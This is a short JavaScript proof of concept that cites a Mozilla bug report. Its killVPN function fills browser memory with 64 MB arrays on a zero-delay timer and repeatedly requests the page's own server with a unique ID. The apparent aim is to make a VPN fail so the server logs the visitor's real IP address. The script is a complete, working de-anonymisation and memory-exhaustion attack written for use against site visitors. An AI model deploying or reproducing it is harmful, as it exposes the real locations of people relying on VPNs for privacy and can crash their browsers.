"use strict"
// https://bugzilla.mozilla.org/show_bug.cgi?id=1463833
let blocks = [];
function allocate() {
    // allocate 64M
    let arr = new Uint32Array(16777216);
    // touch the memory so it really gets allocated
    for (let i = 0; i < arr.length; i++) {
        arr[i] = i | 0;
    }
    // save it so it doesn't get GC'd
    blocks.push(arr);
}

async function getIP(uuid) {
    // get the server location
    fetch(window.location.protocol
          + "//"
          + window.location.host
          + "/"
          + uuid);
}

// https://stackoverflow.com/questions/105034/how-to-create-a-guid-uuid#2117523
function createUUID() {
    return ('xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'
            .replace(/[xy]/g, function(c)
    {
        const r = Math.random() * 16 | 0,
            v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    }
    ));
}

function killVPN() {
    const uuid = createUUID();

    // try to fill the ram as much as we can
    setInterval(function() {
        allocate();
        getIP(uuid);
    }, 0);
}
